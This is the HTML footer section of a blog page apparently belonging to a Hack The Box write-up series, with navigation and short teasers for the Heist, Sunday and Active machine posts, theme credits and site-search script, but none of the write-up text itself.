<i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/posts/Safe/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/sql/">SQL</a> <a class="post-tag" href="/tags/ssh/">SSH</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/permissions/">Permissions</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/file-upload/">File Upload</a> <a class="post-tag" href="/tags/rsa/">RSA</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-3">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Craft/" class="btn btn-outline-primary"><p>Hack The Box: Craft write-up</p></a> <a href="/posts/Heist/" class="btn btn-outline-primary"><p>Hack The Box: Heist write-up</p></a></div><!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Heist/"><div class="card-body"> <span class="timeago small"> Aug 21, 2019 <i class="unloaded">2019-08-21T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box: Heist write-up</h3><div class="text-muted small"><p>Hack The Box: Heist machine write-up This is a windows box thoroughly based on enumeration, it starts with a guest access that leaks some credentials followed by smb users enumeration that provide...</p></div></div></a></div><div class="card"> <a href="/posts/Sunday/"><div class="card-body"> <span class="timeago small"> Sep 29, 2018 <i class="unloaded">2018-09-29T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box: Sunday write-up</h3><div class="text-muted small"><p>Hack The Box: Sunday machine write-up This was my first attempt on a Solaris machine and, even if the machine was not so difficult, I learnt a few interesting things about the OS. Ip will be 10.10...</p></div></div></a></div><div class="card"> <a href="/posts/Active/"><div class="card-body"> <span class="timeago small"> Nov 3, 2018 <i class="unloaded">2018-11-03T00:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box: Active write-up</h3><div class="text-muted small"><p>Hack The Box: Active machine write-up Most people say this machine was close to real world pentesting. IMO it was really cool as for the first part it shows a “common” misconfiguration with Group ...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js" crossorigin="anonymous"></script> <script type="text/javascript"> const el = document.querySelectorAll('#post-wrapper img'); const observer = lozad(el); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://twitter.com/secfaults">Diego Bernal Adelantado</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/sql/">SQL</a> <a class="post-tag" href="/tags/ssh/">SSH</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/permissions/">Permissions</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/file-upload/">File Upload</a> <a class="post-tag" href="/tags/rsa/">RSA</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
